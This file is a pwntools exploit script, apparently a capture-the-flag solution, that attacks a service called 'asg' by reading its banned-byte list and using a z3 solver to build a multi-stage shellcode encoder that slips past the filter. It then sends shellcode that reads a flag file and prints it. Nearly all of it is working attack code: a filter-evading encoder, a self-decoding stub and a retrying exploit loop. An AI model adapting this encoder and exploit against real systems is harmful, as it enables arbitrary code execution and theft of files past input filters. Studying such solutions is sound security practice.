#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host localhost --port 9025
import os

os.environ["PWNLIB_NOTERM"] = "1"
os.environ["PWNLIB_COLOR"] = "always"

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("./asg")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'localhost'
port = int(args.PORT or 9025)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

context.terminal = ["kitty"]

import z3

ALLOWED_LENGTH = 128
SHELLCODE_LENGTH = 1000

def in_(x, s):
    return z3.Or([x == i for i in s])

def subsetsum_n(allowed, target, n):
    allowed = set(ord(x) for x in allowed)
    s = z3.Solver()
    vars  = z3.BitVecs(" ".join('x{i}'.format(i=i) for i in range(n)), 16)
    for var in vars:
        s.add(in_(var & 0xff, allowed))
        s.add(in_((var >> 8) & 0xff, allowed))
        s.add(var >= 0x80)
    s.add(z3.Sum(vars) == target)
    if s.check() == z3.sat:
        m = s.model()
        return [m.eval(var) for var in vars]
    else:
        return None

def subsetsum(allowed, target):
    for n in range(1, 0x10):
        res = subsetsum_n(allowed, target, n)
        if res is not None:
            return res
    else:
        raise Exception("subsetsum failed to find a match")

class EncodingException(Exception):
    pass


nop = asm("nop")

class BaseEncoder(object):
    def __init__(self, allowed):
        self.allowed = allowed

    def _check_filter(self, b):
        return set(b) <= set(self.allowed)
class Stage1Encoder(BaseEncoder):
    # encodes the given shellcode by sending a shellcode which allocates a stack frame and pushes our shellcode on this frame
    # for this two work we must be able to push the correct values - done with `pushw reg` and `lea reg, [reg+diff]`
    # 1. `pushw reg` pushes the short value onto the stack. it requires f and another byte that depends on the used register
    # 2. `lea reg, [reg+diff]` lets us set the correct value for reg. it requires H \x8d \x80 and diff. we can use multiple lea's to
    # achieve the target value as long as each diff can be encoded. we use a simple subsetsum solver using z3 to find such diffs.
    #
    # at the end the RWX region should look like:
    #
    #      stack frame
    # ┌─────────────────────┐
    # │                     │
    # │  encoded shellcode  │
    # │                     │
    # ├─────────────────────┤
    # │                     │
    # │                     │
    # │                     │
    # ├─────────────────────┤
    # │                     │
    # │    encoding         │
    # │                     │
    # │       shellcode     │
    # │                     │
    # └─────────────────────┘
    # 
    # so if we want to run the encoded shellcode we must either jump to it (which is difficult because of the filter) or encoded some more nops until we
    # get:
    #
    #      stack frame
    # ┌─────────────────────┐
    # │                     │
    # │  encoded shellcode  │
    # │                     │
    # ├─────────────────────┤
    # │                     │
    # │        nops         │
    # │                     │
    # ├─────────────────────┤
    # │                     │
    # │    encoding         │
    # │                     │
    # │       shellcode     │
    # │                     │
    # └─────────────────────┘
    # 
    # now the next shellcode will start after the encoded shellcode, so we need to pad with random values until we reach the end of the stack frame
    #
    # this encoding is not space efficient at all as we encode each **short** with multiple **instructions**. thus, it is best used to encode some other
    # more efficient decoder (stage2).
    # 
    # overall we need: H \x8d % \x80 \x00 f and some other byte that depend on the encoding register (7 options) - so overall ~6 bits

    # cache since asm takes time
    regs_to_asm = {
        (short, full): (asm("pushw {short}".format(short=short)), asm("lea {full}, [{full}+0x41414141]".format(full=full))[:-4]) for short, full in
        (
            ("ax", "rax"),
            ("bx", "rbx"),
            ("cx", "rcx"),
            ("dx", "rdx"),
            ("si", "rsi"),
            ("di", "rdi"),
            ("bp", "rbp")
        )
    }

    def __init__(self, allowed):
        super(Stage1Encoder, self).__init__(allowed)

        self.reg = 0
        self.rsp_off = 0
        self.rip_off = 0
        self.stack_frame_size = 0
        self._select_reg()

    def set_frame_size(self, frame_size):
        self.rip_off = 0
        self.stack_frame_size = self.rsp_off = frame_size

    def _select_reg(self):
        for (push, lea) in self.regs_to_asm.values():
            if self._check_filter(push) and self._check_filter(lea):
                self.push_reg = push
                self.lea_reg = lea
                return

        raise EncodingException("cannot find regs!")

    def add_raw(self, b):
        if not self._check_filter(b):
            return False
        
        self.rip_off += len(b)

        return True

    def _push(self, num):
        # assumes fH\x8d and various other bytes which depend on the selected regs
        assert num < 0x10000

        ret = b""
        if num != self.reg:
            diffs = subsetsum(self.allowed, (num - self.reg) & 0xffff)
            ret += b"".join(self.lea_reg + p32(diff.as_long()) for diff in diffs)

        ret += self.push_reg

        if not self.add_raw(ret):
            # should never happen unless \x00 is not allowed
            raise EncodingException("cannot encode push!")
        
        self.reg = num
        self.rsp_off -= 2

        return ret

    def _push_shellcode(self, b):
        res = b""

        if len(b) % 2:
            # pushed length is always even, add a nop
            b = nop + b

        debug("pushing %r" % b)
        
        for i in range(0, len(b), 2):
            res += self._push(u16(b[::-1][i:i+2][::-1]))

        return res

    def _pad_nops(self):
        # pushes nops onto the stack. since the push is 2 bytes long, it may curropt the next push instruction
        # however as we push \x90\x90 and the push is fP we may only result in fH which is nop too.
        ret = b""
        while self.rip_off < self.rsp_off:
            ret += self._push_shellcode(nop * 2)  # nops

        return ret

    def _pad_to_frame(self):
        return self.allowed[0] * (self.stack_frame_size - self.rip_off)

    def _pad(self):
        # pad_nops pads the built shellcode until it reaches our shellcode, pad_to_frame pads the payload
        # so that the next encoder will start after the built shellcode
        return self._pad_nops() + self._pad_to_frame()

    def encode(self, shellcode):
        shellcode_encoded = self._push_shellcode(shellcode)
        assert len(shellcode) + len(shellcode_encoded) < self.stack_frame_size
        
        shellcode = shellcode_encoded
        shellcode += self._pad()

        return shellcode

class Stage2Encoder(BaseEncoder):
    # encodes each short in the shellcode as 3 unfiltered shorts which sum to it. 
    def encode(self, b):        
        if len(b) % 2:
            # pushed length is always even, add a nop
            b = nop + b

        res = b""
        for i in range(0, len(b), 2):
            parts = subsetsum_n(self.allowed, u16(b[i:i+2]), 3)  # 3 should be enough
            if parts is None:
                raise EncodingException("could not partition {}!".format(u16(b[i:i+2])))
            
            res += b"".join([p16(x.as_long()) for x in parts])

        decoder = self._get_decoder(res)

        return decoder, res
    
    def _get_decoder(self, encoded_shellcode):
        return asm("""
lea rsp, [rip+end]
mov rbp, rsp
mov rcx, {stage_2_length}
start:
popw ax
popw bx
popw dx
add ax, bx
add ax, dx
mov word [rbp-2], ax  # bug? must use -2 to write at correct offset?
lea rbp, [rbp+2]
loop start
end:
""".format(stage_2_length=len(encoded_shellcode) // 3))

class Encoder(BaseEncoder):
    # encoder receives the allowed bytes and encodes a given shellcode with those bytes.
    # raises an exception if unsuccessful.
    # the encoding is done in 4 steps (stage -1, 0, 1 and 2):
    # -1. allocate an initial frame for stage 0. done with `lea rsp, [rip+{off}]``. this assumes H \x8d % \x00 and off
    #  0. allocate a controlled size frame for stage 1
    # 1.  stage 1 is done by allocating stack frames in the RWX region and pushing our encoded shellcodes to the stack
    # 2.  stage 2 is written in with another, more compact encoding and uses stage1 to encode its decoder
    STAGE_0_FRAME_SIZE = ord("f")
    STAGE_MINUS_1 = asm("""
        lea rsp, [rip+{off}]
    """.format(off=STAGE_0_FRAME_SIZE))
    
    STAGE_1_FRAME_SIZE = 400
    STAGE_0 = asm("lea rsp, [rip+{}]".format(STAGE_1_FRAME_SIZE))

    def __init__(self, allowed):
        super(Encoder, self).__init__(allowed)
        self.stage_1_encoder = Stage1Encoder(self.allowed)

    def encode_stage_minus_1(self, stage_minus_1):
        # assumes H\x8df %\x00        
        if not self._check_filter(stage_minus_1):
            raise EncodingException("cannot encode mov rsp rip")

        self.stage_1_encoder.set_frame_size(self.STAGE_0_FRAME_SIZE)

        return stage_minus_1

    def encode_stage_0(self, stage_0):
        res = self.stage_1_encoder.encode(stage_0)

        # stage 0 reserves STAGE_1_FRAME_SIZE bytes
        self.stage_1_encoder.set_frame_size(self.STAGE_1_FRAME_SIZE)
        
        return res

    def encode_stage_1(self, stage_1):
        return self.stage_1_encoder.encode(stage_1)

    def encode(self, shellcode):
        res = self.encode_stage_minus_1(self.STAGE_MINUS_1)

        res += self.encode_stage_0(self.STAGE_0)
        info("encoded stage 0")

        stage_1, stage_2_encoded = Stage2Encoder(self.allowed).encode(shellcode)
        info("encoded stage 2")

        res += self.encode_stage_1(stage_1)
        info("encoded stage 1")
    
        res += stage_2_encoded

        return res

def recvregex(io, regex):
    return re.search(regex, io.recvregex(regex))

def add_custom_template(os, name, path):
    shellcraft.cat("")  # assign lookup
    from pwnlib.shellcraft.internal import lookup
    lookup.put_string("amd64/"+ os + "/" + name, open(path, "rb").read())
    shellcraft._submodules["amd64"]._shellcodes[name] = os + "/" + name

try:
    shellcraft.cat2
except:
    add_custom_template("linux", "cat2", "./cat2.asm")

for i in range(0x100):
    info("attempt {i}".format(i=i+1))

    io = start(env={"LD_PRELOAD": "./nosleep.so:./noshutdown.so:./nochroot.so:./noalarm.so"})

    io.sendline(b"")

    io.recvuntil(b"these are filtered set of bytes:\n")
    filtered = io.recv(ALLOWED_LENGTH)
    allowed = bytes(bytearray(set([chr(x) for x in range(256)]) - set(filtered)))
    info("filtered bytes: {filtered}".format(filtered=repr(filtered)))
    info("allowed bytes: {allowed}".format(allowed=repr(allowed)))

    filename = recvregex(io, b"flag is inside this file: \[(.*)\]").group(1).decode()
    info("flag file: {filename}".format(filename=filename))

    try:
        shellcode = Encoder(allowed).encode(asm(shellcraft.cat2(filename, length=0x100)))
    
        assert set(shellcode) < set(allowed), "encoder gave invalid shellcode!"
    except EncodingException as e:
        info("filtered out...: {e}".format(e=e))
        io.close()
        continue

    assert len(shellcode) <= SHELLCODE_LENGTH, "shellcode too long!"

    io.send(shellcode)
    io.recvuntil(b"buena suerte!\n")
    
    success("flag = '{}'".format(term.text.bold_italic_yellow(io.recvall().decode().strip())))
    break
else:
    error("failed.")